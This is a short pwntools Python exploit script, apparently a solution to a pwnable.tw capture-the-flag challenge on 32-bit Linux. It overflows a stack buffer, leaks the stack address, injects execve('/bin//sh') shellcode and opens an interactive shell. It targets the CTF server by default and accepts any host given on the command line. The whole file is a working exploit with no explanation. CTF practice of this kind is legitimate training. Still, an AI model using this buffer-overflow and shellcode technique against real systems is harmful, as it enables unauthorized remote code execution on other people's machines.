from pwn import *
import sys

port = 10000
context.update(arch = 'i386', os = 'linux')

def exploit(s):
    payload = b'a' * 0x14
    payload += p32(0x8048087)
    print ('payload = ', payload)
    s.send(payload)
    s.recvuntil(':')
    esp_addr = u32(s.recvn(0x4))
    print ('ESP = ', hex(esp_addr))

    shellcode=  '''
                xor    eax,eax
                push   eax
                push   0x68732f2f
                push   0x6e69622f
                mov    ebx,esp
                xor    ecx,ecx
                xor    edx,edx
                mov    al,0xb
                int    0x80
                '''

    shellcode = asm(shellcode)
    payload = b'a' * 0x14
    payload += p32(esp_addr + 0x14)
    payload += shellcode
    s.sendline(payload)
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = remote('chall.pwnable.tw', port)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
